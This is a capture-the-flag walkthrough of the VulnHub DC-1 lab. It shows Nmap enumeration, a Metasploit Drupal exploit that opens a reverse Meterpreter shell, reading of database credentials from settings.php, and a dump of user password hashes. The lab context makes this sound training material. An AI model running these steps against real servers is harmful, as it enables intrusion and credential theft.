---
title: D C 1 VulnHub Walkthrough
description: 
date: 2025-02-05
categories: [CTF, VulnHub]
tags: [vulnhub, ctf, walkthrough, dc]
permalink: /dc-1-vulnhub-walkthrough/
image:  
  path: /assets/img/thumbnails/dc-1.png
private: true
---

## Introduction

DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.

It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.

To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.

There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.

There are five flags in total, but the ultimate goal is to find and read the flag in root's home directory. You don't even need to be root to do this, however, you will require root privileges.

Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.

Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.

Download : [Download Now](https://download.vulnhub.com/dc/DC-1.zip)

Setup Guide : [Read Now](https://neospl0it.github.io/cybersploit-1-vulnhub-walkthrough/#starting-up-the-vm)


## Enumeration

For this walkthrough, the target IP is **192.168.1.5**.

**Scanning for Open Ports**

Next, perform an aggressive Nmap scan to identify open ports and running services:

```bash
root@neo ~# nmap -A 192.168.1.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 19:42 IST
Nmap scan report for DC-1.bbrouter (192.168.1.5)
Host is up (0.00055s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-server-header: Apache/2.2.22 (Debian)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38358/tcp6  status
|   100024  1          38877/udp   status
|   100024  1          44393/udp6  status
|_  100024  1          60934/tcp   status
MAC Address: 08:00:27:30:5C:7A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms DC-1.bbrouter (192.168.1.5)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.05 seconds
```

**Findings:**

- **Port 22:** OpenSSH 6.0p1 (for potential SSH access)
    
- **Port 80:** Running an Apache web server with **Drupal 7**
    
- **Port 111:** Running `rpcbind` (could be useful later)
    

## Web Application Enumeration

### Checking Port 80 (HTTP)

Visiting `http://192.168.1.5/` in a browser reveals a **Drupal**.

![Browser Image](/assets/img/bposts/dc-walkthrough/browser-img.png)

### Scanning for Hidden Directories

Using `gobuster` or `dirb`, no significant directories were found.
lets see which version was running using wappalayzer the cms was drupal 7

### Identifying Exploits

Using Wappalyzer, we confirmed the CMS is **Drupal 7**. Searching online for exploits, we found **Drupalgeddon2**, a known Remote Code Execution (RCE) exploit.

**Exploit Reference:**

- `CVE-2018-7600`
    
- `Drupalgeddon2` (Forms API Property Injection)

## Exploiting Drupalgeddon2

We will use **Metasploit** to exploit Drupalgeddon2 and gain a shell.

```bash
root@neo ~# msfconsole
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
Metasploit tip: Open an interactive Ruby terminal with irb
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v6.4.39-dev-                         ]
+ -- --=[ 2468 exploits - 1274 auxiliary - 431 post       ]
+ -- --=[ 1475 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search drupal 7

Matching Modules
================

   #   Name                                                              Disclosure Date  Rank       Check  Description
   -   ----                                                              ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2     \_ target: Automatic (PHP In-Memory)                            .                .          .      .
   3     \_ target: Automatic (PHP Dropper)                              .                .          .      .
   4     \_ target: Automatic (Unix In-Memory)                           .                .          .      .
   5     \_ target: Automatic (Linux Dropper)                            .                .          .      .
   6     \_ target: Drupal 7.x (PHP In-Memory)                           .                .          .      .
   7     \_ target: Drupal 7.x (PHP Dropper)                             .                .          .      .
   8     \_ target: Drupal 7.x (Unix In-Memory)                          .                .          .      .
   9     \_ target: Drupal 7.x (Linux Dropper)                           .                .          .      .
   10    \_ target: Drupal 8.x (PHP In-Memory)                           .                .          .      .
   11    \_ target: Drupal 8.x (PHP Dropper)                             .                .          .      .
   12    \_ target: Drupal 8.x (Unix In-Memory)                          .                .          .      .
   13    \_ target: Drupal 8.x (Linux Dropper)                           .                .          .      .
   14    \_ AKA: SA-CORE-2018-002                                        .                .          .      .
   15    \_ AKA: Drupalgeddon 2                                          .                .          .      .
   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  .                .          .      .
   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   .                .          .      .
   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   22    \_ target: PHP In-Memory                                        .                .          .      .
   23    \_ target: Unix In-Memory                                       .                .          .      .
   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval
```


Identify the relevant module:

```bash
msf6 > use 16
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/drupal_drupageddon) > show options

Module options (exploit/multi/http/drupal_drupageddon):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The target URI of the Drupal installation
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.8      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Drupal 7.0 - 7.31 (form-cache PHP injection method)



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.1.5
RHOSTS => 192.168.1.5
msf6 exploit(multi/http/drupal_drupageddon) > run

[*] Started reverse TCP handler on 192.168.1.8:4444 
[*] Sending stage (40004 bytes) to 192.168.1.5
[*] Meterpreter session 1 opened (192.168.1.8:4444 -> 192.168.1.5:49666) at 2025-02-04 20:02:00 +0530
```

### Exploring the File System

```bash

meterpreter > ls
Listing: /var/www
=================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  747324309678    fil   188498731153-02-09 08:03:43 +0530  .gitignore
100644/rw-r--r--  24769076401799  fil   188498731153-02-09 08:03:43 +0530  .htaccess
100644/rw-r--r--  6360846566857   fil   188498731153-02-09 08:03:43 +0530  COPYRIGHT.txt
100644/rw-r--r--  6231997547947   fil   188498731153-02-09 08:03:43 +0530  INSTALL.mysql.txt
100644/rw-r--r--  8048768714578   fil   188498731153-02-09 08:03:43 +0530  INSTALL.pgsql.txt
100644/rw-r--r--  5574867551506   fil   188498731153-02-09 08:03:43 +0530  INSTALL.sqlite.txt
100644/rw-r--r--  76712410891717  fil   188498731153-02-09 08:03:43 +0530  INSTALL.txt
100755/rwxr-xr-x  77704548337324  fil   188270147139-03-11 20:32:15 +0530  LICENSE.txt
100644/rw-r--r--  35180077129727  fil   188498731153-02-09 08:03:43 +0530  MAINTAINERS.txt
100644/rw-r--r--  23089744188672  fil   188498731153-02-09 08:03:43 +0530  README.txt
100644/rw-r--r--  41412074677674  fil   188498731153-02-09 08:03:43 +0530  UPGRADE.txt
100644/rw-r--r--  28363964029388  fil   188498731153-02-09 08:03:43 +0530  authorize.php
100644/rw-r--r--  3092376453840   fil   188498731153-02-09 08:03:43 +0530  cron.php
100644/rw-r--r--  223338299444    fil   211037522224-07-25 09:51:02 +0530  flag1.txt
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-09 08:03:43 +0530  includes
100644/rw-r--r--  2272037700113   fil   188498731153-02-09 08:03:43 +0530  index.php
100644/rw-r--r--  3019362009791   fil   188498731153-02-09 08:03:43 +0530  install.php
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-09 08:03:43 +0530  misc
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-09 08:03:43 +0530  modules
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-09 08:03:43 +0530  profiles
100644/rw-r--r--  6704443950617   fil   188498731153-02-09 08:03:43 +0530  robots.txt
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-09 08:03:43 +0530  scripts
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-09 08:03:43 +0530  sites
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-09 08:03:43 +0530  themes
100644/rw-r--r--  85645942869477  fil   188498731153-02-09 08:03:43 +0530  update.php
100644/rw-r--r--  9354438772866   fil   188498731153-02-09 08:03:43 +0530  web.config
100644/rw-r--r--  1791001362849   fil   188498731153-02-09 08:03:43 +0530  xmlrpc.php

meterpreter > cat flag1.txt
Every good CMS needs a config file - and so do you.
meterpreter > 

```

We find a file named **flag1.txt** in `/var/www`:

**Flag 1 Hint:** Look for the Drupal configuration file to find database credentials.

Lets Google it :
![[google-config-file.png]]

`/sites/default/settings.php`

```bash
meterpreter > cd sites
meterpreter > ls
Listing: /var/www/sites
=======================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  3882650436488   fil   188498731153-02-09 08:03:43 +0530  README.txt
040755/rwxr-xr-x  17592186048512  dir   188498731153-02-09 08:03:43 +0530  all
040555/r-xr-xr-x  17592186048512  dir   211037744751-06-29 06:34:17 +0530  default
100644/rw-r--r--  10157597657405  fil   188498731153-02-09 08:03:43 +0530  example.sites.php

meterpreter > cd default
meterpreter > ls
Listing: /var/www/sites/default
===============================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  99651831224994  fil   188498731153-02-09 08:03:43 +0530  default.settings.php
040775/rwxrwxr-x  17592186048512  dir   211037438521-10-10 13:56:47 +0530  files
100444/r--r--r--  68672232111733  fil   211037744751-06-29 06:34:17 +0530  settings.php
```


```bash
meterpreter > cat settings.php
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

/**
```


Here You can see the mysql username and password  

Lets gain shell and stablalise it by tty swpan shell

```bash
meterpreter > shell
Process 3350 created.
Channel 4 created.
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@DC-1:/var/www/sites/default$ 
```


now lets use mysql 

```bash
mysql -u dbuser -p
```

mysql -u = username -p password


```bash
www-data@DC-1:/var/www/sites/default$ mysql -u dbuser -p
mysql -u dbuser -p
Enter password: R0ck3t

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1784
Server version: 5.5.60-0+deb7u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```


Lets check the databases available :

```sql
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| drupaldb           |
+--------------------+
2 rows in set (0.00 sec)

mysql> use drupaldb
use drupaldb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show tables;
show tables;
+-----------------------------+
| Tables_in_drupaldb          |
+-----------------------------+
| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
| block_node_type             |
| block_role                  |
| blocked_ips                 |
| cache                       |
| cache_block                 |
| cache_bootstrap             |
| cache_field                 |
| cache_filter                |
| cache_form                  |
| cache_image                 |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| cache_update                |
| cache_views                 |
| cache_views_data            |
| comment                     |
| ctools_css_cache            |
| ctools_object_cache         |
| date_format_locale          |
| date_format_type            |
| date_formats                |
| field_config                |
| field_config_instance       |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_usage                  |
| filter                      |
| filter_format               |
| flood                       |
| history                     |
| image_effects               |
| image_styles                |
| menu_custom                 |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| node_type                   |
| queue                       |
| rdf_mapping                 |
| registry                    |
| registry_file               |
| role                        |
| role_permission             |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| shortcut_set                |
| shortcut_set_users          |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| taxonomy_vocabulary         |
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| views_display               |
| views_view                  |
| watchdog                    |
+-----------------------------+
80 rows in set (0.00 sec)

mysql> 
```

lets use users 

```sql
mysql> select * from users;
select * from users;
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |
|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |
|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |
+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
3 rows in set (0.00 sec)
```


We have 2 users admin and fred and a hash password

